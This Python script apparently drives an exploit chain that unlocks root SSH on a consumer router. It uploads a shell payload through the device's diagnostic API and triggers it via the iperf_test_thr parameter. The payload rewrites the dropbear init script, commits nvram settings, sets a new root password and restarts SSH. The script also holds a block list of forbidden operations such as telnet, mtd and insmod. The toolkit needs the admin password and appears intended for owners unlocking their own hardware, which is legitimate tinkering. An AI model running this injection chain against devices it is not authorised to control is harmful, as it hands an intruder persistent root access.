#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dedicated SSH-only entry. It is not on the interactive menu.

    python3 preflight_ssh_only.py
    python3 ssh_only.py

No arguments. The admin password and the new root password are prompted
and are not read from the command line. This file does not contain a
root password.

The entry keeps the existing connect7 sequence and refuses every other
mutation. It does not call post_connect. A failed or timed-out step
stops the process. There is no telnet, bdata, dropbearmulti, uart,
boot-menu, firewall, clock, reboot, or firmware/BL2/FIP action.

Residue this entry does not roll back
--------------------------------------
Earlier steps can already have changed the device when a later step
stops. Nothing here restores them.

- nvram ssh_en=1, boot_wait=on, and bootdelay=3 may already be committed.
- /etc/init.d/dropbear may already be edited and enabled, and dropbear
  may already have been restarted. The root password may already be the
  new value.
- diag iperf_test_thr may remain 22, 800008, 990000, 990001, or 990002.
- The same shell function that runs passwd also runs ``rm -f /tmp/psw.txt``.
  If that function stops before the rm, /tmp/psw.txt can still hold the
  new password.
- /etc/diag_info/stat/firewall/payload.sh is the uploaded script and it
  contains the new root password. After SSH answers, one exact rm of
  that file and /tmp/psw.txt is attempted. If SSH never answers, or the
  rm fails, either file can remain. That rm is not a rollback of nvram,
  dropbear, or the password.
"""

import re
import sys

import connect7
from gateway import ExploitNotWorked, create_gateway, die


PASSWORD_RE = re.compile(r'^[A-Za-z0-9._~-]{8,64}$')
PROHIBITED = (
    'telnet', 'bdata', 'uart_en', 'bootmenu', 'dropbearmulti',
    'firewall', 'reboot', '\nmtd', ' mtd', 'bl2', 'fip', 'breed',
    'crontabs', 'insmod',
)
CLEANUP = 'rm -f /tmp/psw.txt /etc/diag_info/stat/firewall/payload.sh'
ALLOWED_FUNCS = ('test', 'unlock_ssh', 'run_ssh')
ALLOWED_DIAG = None  # filled after connect7 constants are known


class MutationRejected(Exception):
    pass


def _diag_values():
    base = connect7.payload_base_num
    return {str(base), str(base + 1), str(base + 2)}


def validate_root_password(password):
    if not isinstance(password, str) or PASSWORD_RE.fullmatch(password) is None:
        raise MutationRejected('root password rejected')
    lowered = password.lower()
    for token in PROHIBITED:
        if token.strip() and token.strip() in lowered:
            raise MutationRejected('root password rejected')
    return password


def build_restricted_payload(root_password):
    validate_root_password(root_password)
    passwd_cmd = (
        "    umask 077 ; printf '%s\\n%s\\n' '{pw}' '{pw}' > /tmp/psw.txt ; "
        "passwd root < /tmp/psw.txt ; rm -f /tmp/psw.txt"
    ).format(pw = root_password)
    unlock = "\n".join([
        "    sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
        "    nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit",
        passwd_cmd,
        "    /etc/init.d/dropbear enable",
    ])
    restart = "    /etc/init.d/dropbear restart"
    body = (
        '#!/bin/sh\n'
        'FUNC_NUM=$( uci -q get diag.config.iperf_test_thr )\n'
        f'if [ "$FUNC_NUM" = "{connect7.payload_base_num}" ]; then\n'
        f'    uci set diag.config.iperf_test_thr={connect7.payload_test_num}\n'
        '    uci commit diag\n'
        'fi\n'
    )
    for idx, cmd in ((1, unlock), (2, restart)):
        num = connect7.payload_base_num + idx
        body += f'if [ "$FUNC_NUM" = "{num}" ]; then \n'
        body += f'uci set diag.config.iperf_test_thr={connect7.payload_def_num} ; uci commit diag \n'
        body += f'{cmd} \n'
        body += 'fi \n'
    assert_payload_allowed(body)
    return body, list(ALLOWED_FUNCS)


def assert_payload_allowed(body):
    lowered = body.lower()
    for token in PROHIBITED:
        if token.strip() and token.strip() in lowered:
            raise MutationRejected('payload contains a prohibited operation')
    required = (
        "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
        'nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit',
        'passwd root < /tmp/psw.txt',
        'rm -f /tmp/psw.txt',
        '/etc/init.d/dropbear enable',
        '/etc/init.d/dropbear restart',
        str(connect7.payload_test_num),
    )
    for item in required:
        if item not in body:
            raise MutationRejected('payload is missing a required operation')
    if "echo -e 'root\\nroot'" in body or '> /tmp/psw.txt' in body and 'rm -f /tmp/psw.txt' not in body:
        raise MutationRejected('payload leaves a password file')


class MutationGate:
    def __init__(self):
        self.cleanup_open = False
        self.cleanup_used = False
        self.diag_values = []
        self.api_paths = []
        self.run_cmds = []

    def check_run(self, command):
        if isinstance(command, (list, tuple)):
            raise MutationRejected('command list rejected')
        if not self.cleanup_open or command != CLEANUP or self.cleanup_used:
            raise MutationRejected('command rejected')
        self.cleanup_used = True
        self.run_cmds.append(command)

    def check_diag(self, value):
        if str(value) not in _diag_values():
            raise MutationRejected('diagnostic value rejected')
        self.diag_values.append(str(value))

    def check_api(self, path, params):
        if path == 'API/xqsystem/get_icon':
            if params is None:
                self.api_paths.append(path)
                return
            name = '' if not isinstance(params, dict) else str(params.get('name', ''))
            ip = '' if not isinstance(params, dict) else str(params.get('ip', ''))
            if connect7.payload_name not in name or not ip:
                raise MutationRejected('listener request rejected')
            self.api_paths.append(path)
            return
        if path == 'API/xqnetwork/diag_get_paras':
            self.api_paths.append(path)
            return
        if path == 'API/xqsystem/upload_log':
            self.api_paths.append(path)
            return
        if path == 'API/xqnetwork/diag_set_paras':
            if not isinstance(params, dict):
                raise MutationRejected('diagnostic request rejected')
            if str(params.get('iperf_test_thr')) not in _diag_values():
                raise MutationRejected('diagnostic request rejected')
            for key in ('usb_read_thr', 'usb_write_thr', 'disk_read_thr', 'disk_write_thr'):
                if str(params.get(key, '0')) != '0':
                    raise MutationRejected('diagnostic request rejected')
            self.api_paths.append(path)
            return
        raise MutationRejected('request rejected')


def install_gate(gw, gate):
    orig_run = gw.run_cmd
    orig_api = gw.api_request
    orig_diag = gw.set_diag_iperf_test_thr

    def run_cmd(command, *args, **kwargs):
        gate.check_run(command)
        return orig_run(command, *args, **kwargs)

    def api_request(path, params = None, *args, **kwargs):
        gate.check_api(path, params)
        return orig_api(path, params, *args, **kwargs)

    def set_diag_iperf_test_thr(value, timeout = None):
        gate.check_diag(value)
        return orig_diag(value, timeout = timeout)

    gw.run_cmd = run_cmd
    gw.api_request = api_request
    gw.set_diag_iperf_test_thr = set_diag_iperf_test_thr
    return gate


def execute(gw, root_password, installer = None):
    validate_root_password(root_password)
    gw.ssh_only = True
    gw.keep_secrets_local = True
    gw._secret_root = root_password
    gate = install_gate(gw, MutationGate())
    body, funcs = build_restricted_payload(root_password)
    saved_body = connect7.payload_body
    saved_funcs = list(connect7.payload_func_list)
    saved_gw = getattr(connect7, 'gw', None)
    installer = installer or connect7.install_exploit
    try:
        connect7.payload_body = body
        connect7.payload_func_list = funcs
        connect7.gw = gw
        connect7.probe_get_icon(gw)
        installer(allowed_peer = gw.ip_addr, srv_timeout = 3)
        connect7.run_exploit('test')
        got = gw.get_diag_iperf_test_thr(timeout = 6)
        if str(got) != str(connect7.payload_test_num):
            raise ExploitNotWorked('diagnostic probe did not match')
        connect7.run_exploit('unlock_ssh', 7)
        connect7.run_exploit('run_ssh', 12)
        if not gw.ping(verbose = 0, contimeout = 20):
            raise ExploitNotWorked('SSH did not answer')
        gate.cleanup_open = True
        gw.run_cmd(CLEANUP)
        return gate
    finally:
        connect7.payload_body = saved_body
        connect7.payload_func_list = saved_funcs
        connect7.gw = saved_gw
        gw._secret_root = None
        gw._secret_web = None


def prompt_new_root_password(getpass_fn = None):
    import getpass
    ask = getpass_fn or getpass.getpass
    first = ask('New root password: ')
    second = ask('Repeat root password: ')
    try:
        if first != second:
            die(2, 'Root password rejected. Use 8 to 64 letters, digits, or . _ ~ - and make the two entries match.')
        return validate_root_password(first)
    except MutationRejected:
        die(2, 'Root password rejected. Use 8 to 64 letters, digits, or . _ ~ - and make the two entries match.')
    finally:
        first = None
        second = None


def main(argv = None):
    argv = list(sys.argv if argv is None else argv)
    if len(argv) > 1:
        die(2, 'ssh_only.py does not accept arguments. Passwords are prompted and are not taken from the command line.')
    root_password = prompt_new_root_password()
    gw = None
    try:
        gw = create_gateway(
            timeout = 4,
            die_if_sshOk = True,
            die_if_ftpOk = True,
            web_login = True,
            try_telnet = False,
            ssh_only = True,
        )
        execute(gw, root_password)
        print('SSH-only sequence finished. SSH answered. No fallback was used.')
    except SystemExit:
        raise
    except Exception:
        die(1, 'Stopped without fallback.')
    finally:
        root_password = None
        if gw is not None:
            gw._secret_root = None
            gw._secret_web = None


if __name__ == '__main__':
    main()
